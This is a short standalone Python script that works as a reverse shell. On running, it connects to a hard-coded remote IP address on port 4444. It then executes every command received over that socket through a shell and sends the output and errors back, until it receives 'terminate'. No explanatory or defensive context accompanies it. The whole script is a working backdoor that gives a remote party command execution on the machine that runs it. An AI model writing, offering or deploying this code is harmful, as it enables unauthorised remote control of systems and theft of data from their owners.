
import socket 
import subprocess 

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('111.111.11.11', 4444)) 
 
    while True: 
        command = s.recv(1024) 
        
        if 'terminate' in command: 
            break 
        
        else: 
            
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() ) 
            s.send( CMD.stderr.read() ) 
def main ():
    connect()
main()